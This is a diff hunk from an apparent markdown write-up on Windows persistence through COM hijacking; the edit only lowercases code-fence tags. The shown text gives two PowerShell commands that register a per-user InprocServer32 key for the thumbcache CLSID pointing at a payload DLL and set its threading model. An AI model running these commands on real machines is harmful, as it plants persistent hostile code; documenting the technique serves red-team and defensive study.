@@ -48,12 +48,12 @@ InprocServer32                 (default)      : C:\Windows\System32\thumbcache.d
 
 If we can change the value of `(default)` from `C:\Windows\System32\thumbcache.dll` to our payload, persistence is succesfully established.
 
-```PowerShell
+```powershell
 New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\Path\To\payload.dll"
 ```
 We also need to change the threading model to support both single threaded and multi-threaded mode.
 
-```PowerShell
+```powershell
 New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
 ```
 
